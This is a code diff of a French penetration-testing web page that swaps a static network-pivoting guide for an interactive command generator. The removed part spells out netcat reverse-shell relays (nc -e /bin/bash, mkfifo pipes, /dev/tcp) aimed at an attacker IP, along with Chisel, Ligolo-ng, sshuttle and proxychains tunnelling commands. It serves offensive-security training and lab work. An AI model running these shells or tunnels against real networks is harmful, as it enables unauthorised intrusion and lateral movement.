-                <p>Établir un reverse shell depuis une machine du réseau interne (Cible Finale) vers votre machine (Attaquant), en passant par la Cible Intermédiaire.</p>
-                <h4>Sur votre Machine (Attaquant)</h4>
-                <p>Lancez un écouteur Netcat sur <code>&lt;PORT_ATTAQUANT&gt;</code> :</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="nc -lvp <PORT_ATTAQUANT>">nc -lvp &lt;PORT_ATTAQUANT&gt;</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
+                
+                <!-- Zone explicative intelligente -->
+                <div class="pivot-explanation-panel">
+                    <div class="explanation-header">
+                        <h4>💡 Explication du Pivot</h4>
+                        <div class="explanation-status" id="explanationStatus">
+                            <span class="status-indicator">🔄</span>
+                            <span>Analysing configuration...</span>
+                        </div>
+                    </div>
+                    
+                    <div class="explanation-content" id="explanationContent">
+                        <div class="explanation-placeholder">
+                            <i>📝</i>
+                            <p>Configurez vos targets pour voir l'explication détaillée du pivot...</p>
+                        </div>
+                    </div>
                 </div>
-                <h4>Sur la Cible Intermédiaire</h4>
-                <p>Créez un relais qui écoute sur <code>&lt;PORT_CIBLE&gt;</code> et redirige vers votre écouteur (<code>&lt;VOTRE_IP&gt;:&lt;PORT_ATTAQUANT&gt;</code>) :</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="mkfifo /tmp/pipe; nc -lvp <PORT_CIBLE> 0&lt;/tmp/pipe | nc <VOTRE_IP> <PORT_ATTAQUANT> 1&gt;/tmp/pipe; rm /tmp/pipe">mkfifo /tmp/pipe; nc -lvp &lt;PORT_CIBLE&gt; 0&lt;/tmp/pipe | nc &lt;VOTRE_IP&gt; &lt;PORT_ATTAQUANT&gt; 1&gt;/tmp/pipe; rm /tmp/pipe</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
                 </div>
-                <h4>Sur la Cible Finale (Réseau Interne)</h4>
-                <p>Connectez-vous au relais sur la Cible Intermédiaire (<code>&lt;CIBLE_INTERMEDIAIRE_IP&gt;:&lt;PORT_CIBLE&gt;</code>) et exécutez un shell :</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="nc <CIBLE_INTERMEDIAIRE_IP> <PORT_CIBLE> -e /bin/bash">nc &lt;CIBLE_INTERMEDIAIRE_IP&gt; &lt;PORT_CIBLE&gt; -e /bin/bash # Linux\nnc <CIBLE_INTERMEDIAIRE_IP> <PORT_CIBLE> -e cmd.exe # Windows</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
-                </div>
-                 <p><em>Note: L'option <code>-e</code> n'est pas toujours disponible. Des alternatives existent (ex: bash -i >& /dev/tcp/...).</em></p>
-                 <h4>Exemple Concret</h4>
-                 <p>Obtenir un shell de <code>192.168.100.50</code> sur <code>10.10.14.5:4444</code> via <code>192.168.1.100:5555</code> :<br>
-                   Attaquant: <code>nc -lvp 4444</code><br>
-                   Intermédiaire: <code>mkfifo /tmp/p; nc -lvp 5555 0&lt;/tmp/p | nc 10.10.14.5 4444 1&gt;/tmp/p; rm /tmp/p</code><br>
-                   Cible Finale (Linux): <code>nc 192.168.1.100 5555 -e /bin/bash</code>
-                </p>
+            </div>
             </div>
 
-            <!-- Section Chisel -->
-            <div class="tab-pane fade technique-section" id="chiselContent" role="tabpanel" aria-labelledby="chisel-tab" data-technique="chisel">
-                <h2><i class="fas fa-chisel"></i> Pivotement avec Chisel</h2>
-                <p>Chisel est un outil rapide de tunneling TCP/UDP sur HTTP, sécurisé via SSH. Très efficace et flexible pour le pivotement.</p>
-
-                <h4>Sur votre Machine (Attaquant) : Serveur Chisel</h4>
-                <p>Lancez le serveur Chisel en mode reverse, écoutant sur <code>&lt;PORT_CHISEL&gt;</code>. Le mode reverse permet aux clients de s'y connecter et d'initier des tunnels.</p>
-                <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="chisel server -p <PORT_CHISEL> --reverse">./chisel server -p &lt;PORT_CHISEL&gt; --reverse</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
+        <!-- Section des résultats -->
+        <div class="results-section" id="resultsSection" style="display: none;">
+            <div class="section-card">
+                <div class="results-header">
+                    <h3>💻 Commandes Générées</h3>
+                    <div class="results-actions">
+                        <button class="btn btn-sm btn-info" onclick="copyAllCommands()">📋 Copier Tout</button>
+                        <button class="btn btn-sm btn-success" onclick="exportScript()">💾 Export Script</button>
+                        <button class="btn btn-sm btn-warning" onclick="exportCheatsheet()">📝 Cheatsheet</button>
+                </div>
                 </div>
 
-                <h3>Port Forwarding (Remote Forward)</h3>
-                <p>Exposer un service interne (<code>&lt;IP_SERVICE_INTERNE&gt;:&lt;PORT_SERVICE_INTERNE&gt;</code>) sur un port de votre machine locale (<code>&lt;PORT_LOCAL&gt;</code>) via le tunnel Chisel.</p>
-                <h4>Sur la Cible Intermédiaire : Client Chisel</h4>
-                <p>Connectez le client au serveur Chisel (<code>&lt;VOTRE_IP&gt;:&lt;PORT_CHISEL&gt;</code>) et spécifiez le remote forward : <code>R:&lt;PORT_LOCAL&gt;:&lt;IP_SERVICE_INTERNE&gt;:&lt;PORT_SERVICE_INTERNE&gt;</code>.</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="chisel client <VOTRE_IP>:<PORT_CHISEL> R:<PORT_LOCAL>:<IP_SERVICE_INTERNE>:<PORT_SERVICE_INTERNE>">./chisel client &lt;VOTRE_IP&gt;:&lt;PORT_CHISEL&gt; R:&lt;PORT_LOCAL&gt;:&lt;IP_SERVICE_INTERNE&gt;:&lt;PORT_SERVICE_INTERNE&gt;</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
+                <div class="commands-container">
+                    <div class="commands-tabs">
+                        <div class="tab-nav" id="commandTabs">
+                            <!-- Tabs générés dynamiquement -->
+                        </div>
                 </div>
-                 <h4>Exemple Concret</h4>
-                 <p>Exposer le service web <code>192.168.100.50:80</code> sur votre port local <code>8080</code> via un serveur Chisel sur <code>10.10.14.5:8000</code> :<br>
-                   Attaquant: <code>./chisel server -p 8000 --reverse</code><br>
-                   Intermédiaire: <code>./chisel client 10.10.14.5:8000 R:8080:192.168.100.50:80</code><br>
-                   Ensuite, accédez à <code>http://127.0.0.1:8080</code> sur votre machine attaquante.
-                </p>
 
-                <h3>SOCKS Proxy</h3>
-                <p>Créer un proxy SOCKS dynamique via le tunnel Chisel. Le client Chisel sur la cible intermédiaire initie la connexion SOCKS, et le serveur Chisel sur votre machine écoute localement (par défaut sur <code>127.0.0.1:1080</code>).</p>
-                 <h4>Sur la Cible Intermédiaire : Client Chisel</h4>
-                 <p>Connectez le client au serveur Chisel (<code>&lt;VOTRE_IP&gt;:&lt;PORT_CHISEL&gt;</code>) et demandez un reverse SOCKS proxy : <code>R:socks</code>.</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="chisel client <VOTRE_IP>:<PORT_CHISEL> R:socks">./chisel client &lt;VOTRE_IP&gt;:&lt;PORT_CHISEL&gt; R:socks</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
+                    <div class="commands-content" id="commandsOutput">
+                        <!-- Commandes générées ici -->
+                    </div>
                 </div>
-                 <h4>Configuration ProxyChains (Attaquant)</h4>
-                 <p>Assurez-vous que votre serveur Chisel tourne. Modifiez <code>/etc/proxychains4.conf</code> :</p>
-                 <pre><code>[ProxyList]
-socks5 127.0.0.1 1080 # Port par défaut du serveur Chisel pour R:socks</code></pre>
-                 <h4>Utilisation (Attaquant)</h4>
-                 <p>Préfixez vos commandes avec <code>proxychains</code> :</p>
-                 <pre><code>proxychains nmap -sT -p 80,445 &lt;IP_SERVICE_INTERNE&gt;
-proxychains curl http://&lt;IP_SERVICE_INTERNE&gt;</code></pre>
-                 <h4>Exemple Concret</h4>
-                 <p>Créer un proxy SOCKS via un serveur Chisel sur <code>10.10.14.5:8000</code> :<br>
-                   Attaquant: <code>./chisel server -p 8000 --reverse</code><br>
-                   Intermédiaire: <code>./chisel client 10.10.14.5:8000 R:socks</code><br>
-                   Attaquant (après config ProxyChains): <code>proxychains nmap -sT -p 80,445 192.168.100.50</code>
-                </p>
+            </div>
+        </div>
+
+        <!-- Section aide -->
+        <div class="help-section">
+            <div class="section-card">
+                <h3>💡 Aide & Tips</h3>
+                
+                <div class="tips-grid">
+                    <div class="tip-card">
+                        <h4>🔐 SSH Tunneling</h4>
+                        <p>Idéal quand SSH est disponible sur la target. Stable et discret.</p>
+                        <code>ssh -D 1080 user@target</code>
+                    </div>
+                    
+                    <div class="tip-card">
+                        <h4>⚡ Chisel</h4>
+                        <p>Excellent pour Windows. Tunnel via HTTP/HTTPS, bypass de firewall.</p>
+                        <code>chisel server -p 8080 --reverse</code>
             </div>
 
-            <!-- Section Ligolo-ng -->
-            <div class="tab-pane fade technique-section" id="ligoloContent" role="tabpanel" aria-labelledby="ligolo-tab" data-technique="ligolo">
-                 <h2><i class="fas fa-bolt"></i> Pivotement avec Ligolo-ng</h2>
-                <p>Ligolo-ng est un outil de pivotement avancé qui utilise une interface réseau virtuelle (TUN) pour router le trafic de manière transparente, évitant les limitations des proxies SOCKS.</p>
-
-                <h4>Sur votre Machine (Attaquant) : Préparation & Serveur Proxy</h4>
-                <p>1. Créer l'interface TUN virtuelle (nommée <code>ligolo</code> ici) :</p>
-                <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="sudo ip tuntap add user $(whoami) mode tun ligolo\nsudo ip link set ligolo up">sudo ip tuntap add user $(whoami) mode tun ligolo
-sudo ip link set ligolo up</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
+                    <div class="tip-card">
+                        <h4>🌐 Double Pivot</h4>
+                        <p>Pour atteindre des réseaux isolés via plusieurs machines compromises.</p>
+                        <code>Attacker → Target1 → Target2 → Target3</code>
+                    </div>
+                    
+                    <div class="tip-card">
+                        <h4>🔗 Port Forwarding</h4>
+                        <p>Local: -L [local]:[target]:[port]<br>Remote: -R [remote]:[local]:[port]</p>
+                        <code>ssh -L 8080:target:80 user@pivot</code>
+                    </div>
                 </div>
-                <p>2. Lancer le serveur proxy Ligolo-ng (il écoutera par défaut sur <code>0.0.0.0:&lt;PORT_LIGOLO&gt;</code>, ici 11601) :</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="./proxy -selfcert">./proxy -selfcert</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
-                </div>
-
-                <h4>Sur la Cible Intermédiaire : Agent Ligolo</h4>
-                <p>Lancez l'agent Ligolo-ng en le faisant se connecter à votre serveur proxy (<code>&lt;VOTRE_IP&gt;:&lt;PORT_LIGOLO&gt;</code>). L'option <code>-ignore-cert</code> est utile si vous utilisez <code>-selfcert</code> côté proxy.</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="./agent -connect <VOTRE_IP>:<PORT_LIGOLO> -ignore-cert">./agent -connect &lt;VOTRE_IP&gt;:&lt;PORT_LIGOLO&gt; -ignore-cert</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
-                </div>
-
-                <h4>Sur votre Machine (Attaquant) : Session Ligolo & Routage</h4>
-                <p>Une fois l'agent connecté, le proxy affichera une nouvelle session. Interagissez avec elle :</p>
-                <p>1. Afficher et sélectionner la session :</p>
-                <pre><code>ligolo &gt; show
-[...]
-Session: 1 | Peer: 192.168.1.100:xxxxx | OS: linux
-ligolo &gt; session 1
-Switched session context to: 1 (192.168.1.100:xxxxx)
-ligolo:1 &gt;</code></pre>
-                <p>2. Démarrer le tunnel pour cette session :</p>
-                <pre><code>ligolo:1 &gt; start
-[+] Started L3 tunnel
-[+] Added route 10.0.0.1/32 dev ligolo
-[+] Network interface is UP</code></pre>
-                <p>3. Ajouter la route vers le réseau interne cible (<code>&lt;RESEAU_INTERNE_CIDR&gt;</code>) via l'interface <code>ligolo</code> (dans un autre terminal) :</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="sudo ip route add <RESEAU_INTERNE_CIDR> dev ligolo">sudo ip route add &lt;RESEAU_INTERNE_CIDR&gt; dev ligolo</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
-                </div>
-                <h4>Utilisation</h4>
-                <p>Vous pouvez maintenant accéder directement aux machines du réseau interne comme si elles étaient sur votre réseau local :</p>
-                <pre><code>ping &lt;IP_SERVICE_INTERNE&gt;
-nmap -sT -p 80,445 &lt;IP_SERVICE_INTERNE&gt;
-curl http://&lt;IP_SERVICE_INTERNE&gt;</code></pre>
-                <h4>Exemple Concret</h4>
-                 <p>Accéder au réseau <code>192.168.100.0/24</code> via <code>192.168.1.100</code>, avec votre IP <code>10.10.14.5</code> et port Ligolo <code>11601</code> :<br>
-                   Attaquant (Setup): <code>sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert</code><br>
-                   Intermédiaire: <code>./agent -connect 10.10.14.5:11601 -ignore-cert</code><br>
-                   Attaquant (Session Ligolo): <code>show</code> -> <code>session 1</code> -> <code>start</code><br>
-                   Attaquant (Terminal): <code>sudo ip route add 192.168.100.0/24 dev ligolo</code><br>
-                   Attaquant (Utilisation): <code>ping 192.168.100.50</code>
-                </p>
+            </div>
             </div>
 
-            <!-- Section SSHuttle -->
-            <div class="tab-pane fade technique-section" id="sshuttleContent" role="tabpanel" aria-labelledby="sshuttle-tab" data-technique="sshuttle">
-                <h2><i class="fas fa-space-shuttle"></i> Pivotement avec SSHuttle</h2>
-                <p>SSHuttle fonctionne comme un "VPN du pauvre" en créant un tunnel transparent via SSH. Il forwarde le trafic TCP (et optionnellement DNS) vers les réseaux spécifiés, sans nécessiter de droits admin sur la cible intermédiaire.</p>
+    </div>
 
-                <h4>Sur votre Machine (Attaquant) : Lancement de SSHuttle</h4>
-                <p>Lancez SSHuttle en spécifiant l'utilisateur et l'IP de la cible intermédiaire (<code>&lt;USERNAME&gt;@&lt;CIBLE_INTERMEDIAIRE_IP&gt;</code>), le(s) réseau(x) interne(s) à router (<code>&lt;RESEAU_INTERNE_CIDR&gt;</code>), et éventuellement en excluant l'IP intermédiaire elle-même (<code>-x &lt;CIBLE_INTERMEDIAIRE_IP&gt;</code>).</p>
-                 <div class="code-block-container">
-                    <pre><code class="language-bash" data-command-template="sshuttle --dns -r <USERNAME>@<CIBLE_INTERMEDIAIRE_IP> <RESEAU_INTERNE_CIDR> -x <CIBLE_INTERMEDIAIRE_IP>">sshuttle --dns -r &lt;USERNAME&gt;@&lt;CIBLE_INTERMEDIAIRE_IP&gt; &lt;RESEAU_INTERNE_CIDR&gt; -x &lt;CIBLE_INTERMEDIAIRE_IP&gt;</code></pre>
-                    <button class="copy-btn" title="Copier la commande"><i class="fa fa-copy"></i></button>
-                </div>
-                <ul>
-                    <li><code>--dns</code> : Transfère également les requêtes DNS via le tunnel (recommandé).</li>
-                    <li><code>-r ...</code> : Hôte distant SSH.</li>
-                    <li><code>&lt;RESEAU_INTERNE_CIDR&gt;</code> : Le(s) sous-réseau(x) à router. Peut être répété (ex: <code>192.168.100.0/24 10.0.50.0/24</code>).</li>
-                    <li><code>-x ...</code> : Exclut une IP ou un sous-réseau du tunnel (utile pour éviter les boucles).</li>
-                    <li>SSHuttle demandera le mot de passe SSH (ou utilisera une clé si configurée).</li>
-                </ul>
-                 <h4>Utilisation</h4>
-                 <p>Une fois SSHuttle lancé (il reste actif en arrière-plan), vous pouvez accéder directement aux machines des réseaux spécifiés :</p>
-                 <pre><code>ping &lt;IP_SERVICE_INTERNE&gt;
-nmap -sT -p 80,445 &lt;IP_SERVICE_INTERNE&gt;
-curl http://&lt;IP_SERVICE_INTERNE&gt;</code></pre>
-                 <h4>Exemple Concret</h4>
-                 <p>Router le trafic pour <code>192.168.100.0/24</code> via <code>192.168.1.100</code> en utilisant le compte <code>user</code> :<br>
-                   <code>sshuttle --dns -r user@192.168.1.100 192.168.100.0/24 -x 192.168.1.100</code><br>
-                   Après authentification SSH, vous pouvez lancer : <code>ping 192.168.100.50</code>.
-                </p>
-            </div>
-
-        </div> <!-- Fin #techniqueTabContent -->
-
-    </div> <!-- Fin #main-content -->
-
-    <!-- Footer -->
     <footer class="main-footer">
         <div class="footer-content">
             <p>Made with ❤️ by Elliot Belt</p>
         </div>
     </footer>
 
-    <!-- Scripts JS -->
-    <!-- Bootstrap JS et dépendances (jQuery, Popper.js) si nécessaire pour les onglets -->
-    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
-    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
-    <!-- Scripts personnalisés -->
+    <!-- Conteneur de notifications -->
+    <div id="notificationContainer" style="position: fixed; top: 20px; right: 20px; z-index: 9999;"></div>
+    
+    <!-- Scripts externes -->
     <script src="/assets/js/sidebar.js"></script>
     <script src="/assets/js/theme.js"></script>
     <script src="/assets/js/language.js"></script>
-    <!-- Script spécifique pour cette page -->
-    <script src="/assets/js/pivoting_guide.js"></script>
 
+    <!-- Script principal du Pivot Master -->
+    <script src="/assets/js/pivot-master.js"></script>
 </body>
 </html> 
